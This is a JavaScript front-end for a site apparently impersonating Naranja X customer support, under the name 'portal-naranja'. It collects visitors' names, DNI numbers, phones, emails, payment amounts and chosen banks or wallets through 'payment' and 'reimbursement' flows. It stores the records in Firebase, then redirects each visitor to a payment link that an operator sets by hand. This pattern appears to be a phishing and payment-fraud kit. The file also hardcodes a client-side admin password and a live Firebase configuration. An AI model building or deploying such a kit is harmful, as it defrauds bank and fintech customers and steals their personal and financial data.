import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDHcfixcpUU4O-RYLmfNzTUDZFB13jEt5s",
  authDomain: "portal-naranja-763f4.firebaseapp.com",
  databaseURL: "https://portal-naranja-763f4-default-rtdb.firebaseio.com",
  projectId: "portal-naranja-763f4",
  storageBucket: "portal-naranja-763f4.firebasestorage.app",
  messagingSenderId: "908694133500",
  appId: "1:908694133500:web:1808b481eeb45c305c9579"
};

const appFB = initializeApp(firebaseConfig);
const db = getDatabase(appFB);

class App {
  constructor() {
    this.state = {
      currentView: 'screen-1', // screen-1, screen-2, screen-3, flow-app-issues, flow-payments, pay-waiting, flow-transfers, claim-banks, claim-instructions, claim-waiting
      client: { name: '', dni: '', phone: '', email: '' },
      currentCategory: null,
      currentOrderId: null,
      claimAmount: '',
      selectedBanks: []
    };
    this.init();
  }

  init() {
    this.updateView();
  }

  formatNumberToAR(numStr) {
    const cleanNum = numStr.toString().replace(/\D/g, '');
    if (!cleanNum) return '';
    return new Intl.NumberFormat('de-DE').format(cleanNum);
  }

  formatCurrencyInput(inputElement) {
    inputElement.value = this.formatNumberToAR(inputElement.value);
  }

  goToScreen(screenNumber) {
    if (screenNumber === 2) this.state.currentView = 'screen-2';
    if (screenNumber === 3) this.state.currentView = 'screen-3';
    this.updateView();
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  // --- NAVEGACIÓN "VOLVER" INTELIGENTE CON PERSISTENCIA ---
  goBack() {
    const view = this.state.currentView;

    if (view === 'screen-2') {
      this.state.currentView = 'screen-1';
    } else if (view === 'screen-3') {
      this.state.currentView = 'screen-2';
    } else if (view === 'flow-app-issues' || view === 'flow-payments' || view === 'flow-transfers') {
      this.state.currentView = 'screen-3';
    } else if (view === 'pay-waiting') {
      this.state.currentView = 'flow-payments';
    } else if (view === 'claim-banks') {
      this.state.currentView = 'flow-transfers';
    } else if (view === 'claim-instructions') {
      this.state.currentView = 'claim-banks';
    } else if (view === 'claim-waiting') {
      this.state.currentView = 'claim-instructions';
    }

    this.updateView();
  }

  updateView() {
    const views = [
      'screen-1', 'screen-2', 'screen-3', 
      'flow-app-issues', 'flow-payments', 'pay-form-view', 'pay-waiting-view', 
      'flow-transfers', 'claim-form-view', 'claim-banks-view', 'claim-instructions-view', 'claim-waiting-view'
    ];

    views.forEach(id => {
      const el = document.getElementById(id);
      if (el) el.classList.add('hidden');
    });

    const navHeader = document.getElementById('nav-header-container');
    const v = this.state.currentView;

    if (v === 'screen-1') {
      document.getElementById('screen-1').classList.remove('hidden');
      if (navHeader) navHeader.classList.add('hidden');
    } else {
      if (navHeader) navHeader.classList.remove('hidden');
    }

    if (v === 'screen-2') {
      document.getElementById('screen-2').classList.remove('hidden');
      this.updateProgress(1, 3, 'Paso 2 de 3: Datos Personales', '33%');
      // Restaurar datos guardados si existen
      if (this.state.client.name) document.getElementById('client-name').value = this.state.client.name;
      if (this.state.client.dni) document.getElementById('client-dni').value = this.state.client.dni;
      if (this.state.client.phone) document.getElementById('client-phone').value = this.state.client.phone;
      if (this.state.client.email) document.getElementById('client-email').value = this.state.client.email;
    } else if (v === 'screen-3') {
      document.getElementById('screen-3').classList.remove('hidden');
      this.updateProgress(2, 3, 'Paso 3 de 3: Gestión', '66%');
    } else if (v === 'flow-app-issues') {
      document.getElementById('flow-app-issues').classList.remove('hidden');
      this.hideProgress();
    } else if (v === 'flow-payments') {
      document.getElementById('flow-payments').classList.remove('hidden');
      document.getElementById('pay-form-view').classList.remove('hidden');
      this.hideProgress();
    } else if (v === 'pay-waiting') {
      document.getElementById('flow-payments').classList.remove('hidden');
      document.getElementById('pay-waiting-view').classList.remove('hidden');
      this.hideProgress();
    } else if (v === 'flow-transfers') {
      document.getElementById('flow-transfers').classList.remove('hidden');
      document.getElementById('claim-form-view').classList.remove('hidden');
      this.hideProgress();
    } else if (v === 'claim-banks') {
      document.getElementById('flow-transfers').classList.remove('hidden');
      document.getElementById('claim-banks-view').classList.remove('hidden');
      this.hideProgress();
    } else if (v === 'claim-instructions') {
      document.getElementById('flow-transfers').classList.remove('hidden');
      document.getElementById('claim-instructions-view').classList.remove('hidden');
      this.hideProgress();
    } else if (v === 'claim-waiting') {
      document.getElementById('flow-transfers').classList.remove('hidden');
      document.getElementById('claim-waiting-view').classList.remove('hidden');
      this.hideProgress();
    }
  }

  updateProgress(current, total, labelText, percentText) {
    const navHeader = document.getElementById('nav-header-container');
    if (navHeader) navHeader.classList.remove('hidden');
    document.getElementById('step-label').innerText = labelText;
    document.getElementById('step-percent').innerText = percentText;
    document.getElementById('progress-bar').style.width = `${(current / total) * 100}%`;
  }

  hideProgress() {
    const p = document.getElementById('progress-container');
    if (p) p.classList.add('hidden');
  }

  handleClientSubmit(e) {
    e.preventDefault();
    this.state.client = {
      name: document.getElementById('client-name').value.trim(),
      dni: document.getElementById('client-dni').value.trim(),
      phone: document.getElementById('client-phone').value.trim(),
      email: document.getElementById('client-email').value.trim()
    };

    const titleHeading = document.getElementById('payment-title-heading');
    if (titleHeading) {
      titleHeading.innerText = `Pago de Resumen a nombre de ${this.state.client.name}`;
    }

    this.goToScreen(3);
  }

  selectCategory(category) {
    this.state.currentCategory = category;
    if (category === 'app_issues') {
      this.state.currentView = 'flow-app-issues';
    } else if (category === 'payments') {
      this.state.currentView = 'flow-payments';
    } else if (category === 'transfers') {
      this.state.currentView = 'flow-transfers';
    }
    this.updateView();
  }

  resetApp() {
    window.location.reload();
  }

  // --- REDIRECCIÓN AUTOMÁTICA EN TIEMPO REAL (FIREBASE LISTENER) ---
  listenToOrderStatus(orderId) {
    const requestsRef = ref(db, 'requests');
    onValue(requestsRef, (snapshot) => {
      const data = snapshot.val() || {};
      Object.values(data).forEach(req => {
        if (req.id === orderId && req.paymentUrl && req.paymentUrl.trim() !== '') {
          // ¡Enlace generado por el admin! Redirección automática inmediata
          window.location.href = req.paymentUrl.trim();
        }
      });
    });
  }

  // --- FLUJO B: PAGOS / RESUMEN ---
  async generatePaymentOrder() {
    const rawAmount = document.getElementById('pay-amount').value.trim();
    const paymentType = document.getElementById('pay-type').value;

    if (!rawAmount) {
      alert('Por favor, ingresa un monto válido a abonar.');
      return;
    }

    const formattedAmount = this.formatNumberToAR(rawAmount);
    const orderId = '#NX-' + Math.floor(1000 + Math.random() * 9000);
    this.state.currentOrderId = orderId;

    const newRequest = {
      id: orderId,
      name: this.state.client.name || 'Cliente Web',
      dni: this.state.client.dni || 'S/D',
      phone: this.state.client.phone || 'S/D',
      email: this.state.client.email || 'S/D',
      category: 'payments',
      amount: formattedAmount,
      paymentType: paymentType,
      selectedBanks: [],
      paymentUrl: '',
      status: 'Pendiente de Link',
      createdAt: Date.now()
    };

    try {
      await push(ref(db, 'requests'), newRequest);
    } catch (error) {
      console.error("Error al guardar en Firebase:", error);
    }

    document.getElementById('display-order-id').innerText = orderId;
    document.getElementById('display-order-amount').innerText = `$${formattedAmount}`;

    this.state.currentView = 'pay-waiting';
    this.updateView();

    // Activar el escucha en tiempo real para redirección automática
    this.listenToOrderStatus(orderId);
  }

  // --- FLUJO C: TRANSFERENCIAS / REINTEGRO ---
  goToBankSelection() {
    const rawAmount = document.getElementById('claim-amount').value.trim();
    if (!rawAmount) {
      alert('Por favor, ingresa el monto a acreditar.');
      return;
    }
    this.state.claimAmount = this.formatNumberToAR(rawAmount);
    this.state.currentView = 'claim-banks';
    this.updateView();
  }

  goToReimbursementInstructions() {
    const checkboxes = document.querySelectorAll('.bank-checkbox:checked');
    const selected = Array.from(checkboxes).map(cb => cb.value);

    if (selected.length === 0) {
      alert('Por favor, selecciona al menos una entidad bancaria o billetera virtual.');
      return;
    }

    this.state.selectedBanks = selected;
    this.state.currentView = 'claim-instructions';
    this.updateView();
  }

  async generateReimbursementOrder() {
    const orderId = '#TR-' + Math.floor(1000 + Math.random() * 9000);
    this.state.currentOrderId = orderId;

    const newClaim = {
      id: orderId,
      name: this.state.client.name || 'Cliente Web',
      dni: this.state.client.dni || 'S/D',
      phone: this.state.client.phone || 'S/D',
      email: this.state.client.email || 'S/D',
      category: 'transfers',
      amount: this.state.claimAmount,
      paymentType: 'Acreditación / Reintegro',
      selectedBanks: this.state.selectedBanks,
      paymentUrl: '',
      status: 'Pendiente de Link',
      createdAt: Date.now()
    };

    try {
      await push(ref(db, 'requests'), newClaim);
    } catch (error) {
      console.error("Error al guardar en Firebase:", error);
    }

    document.getElementById('display-claim-id').innerText = orderId;
    document.getElementById('display-claim-amount').innerText = `$${this.state.claimAmount}`;

    this.state.currentView = 'claim-waiting';
    this.updateView();

    // Activar el escucha en tiempo real para redirección automática
    this.listenToOrderStatus(orderId);
  }

  openAdminModal() {
    document.getElementById('admin-auth-modal').classList.remove('hidden');
  }

  closeAdminModal() {
    document.getElementById('admin-auth-modal').classList.add('hidden');
  }

  verifyAdminPass() {
    const pass = document.getElementById('admin-pass-input').value;
    if (pass === 'admin123') {
      sessionStorage.setItem('nx_admin_auth', 'true');
      window.location.href = 'admin.html';
    } else {
      alert('Clave incorrecta');
    }
  }
}

window.app = new App();
